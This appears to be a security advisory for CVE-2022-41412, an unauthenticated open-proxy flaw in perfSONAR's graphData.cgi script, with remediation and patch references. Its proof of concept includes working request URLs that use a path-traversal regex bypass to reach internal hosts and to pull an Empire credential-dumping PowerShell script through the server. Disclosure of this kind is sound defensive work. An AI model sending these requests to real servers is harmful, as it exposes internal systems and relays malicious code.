Vendor: perfSONAR<br>
Link: https://github.com/perfsonar/<br>
Affected Versions: v4.x <= v4.4.4<br>
Vulnerability Type: Open Proxy Relay<br>
Vulnerability Family: CGI Abuses<br>
Discovered by: Ryan Moore<br>
CVE: CVE-2022-41412

# Summary

perfSONAR bundles with it a graphData.cgi script, used to graph and visualize data.  There is a flaw in graphData.cgi allowing for unauthenticated users to proxy and relay HTTP/HTTPS traffic through the perfSONAR server.  The vulnerability can potentially be leveraged to exfiltrate or enumerate data from internal web servers.  

This vulnerability was patched in perfSONAR v4.4.5.

There is a whitelisting function that will mitigate, but is disabled by default.

# Proof of Concept 

## Examples

Here are three examples of this vulnerability in use.  To pass a regex match, the URL must include /esmond/perfsonar/archive/../../../ . 

### Example 1:

In this example, www.google.com is proxied through perfSONAR server.<br> 
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=https://www.google.com/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4 

![This is an image](https://github.com/renmizo/CVE-2022-41412/blob/main/ss1.jpg)

### Example 2:

In this example, sample data is exfiltrated from another adjacent internal web host, running an arbitrary port 4444.<br>
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://192.168.68.113:4444/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4

![This is an image](https://github.com/renmizo/CVE-2022-41412/blob/main/ss2.jpg)

### Example 3:

In this example, we are able to download a malicious Powershell script through the perfSONAR server.<br>
https://192.168.68.145/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=https://raw.githubusercontent.com/esmond/perfsonar/archive/../../../EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1&src=8.8.8.8&dest=8.8.4.4

![This is an image](https://github.com/renmizo/CVE-2022-41412/blob/main/ss3.jpg)

# Remediation

Enable whitelisting in perfSONAR.<br>
Update perfSONAR to 4.4.5 or newer.

# References

* https://lists.internet2.edu/sympa/arc/perfsonar-user/2022-09/msg00030.html
* https://github.com/perfsonar/graphs/commit/463e1d9dc30782d9b1c002143551ec78b74e03bb
* https://www.perfsonar.net/releasenotes-2022-09-20-4-4-5.html
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41412


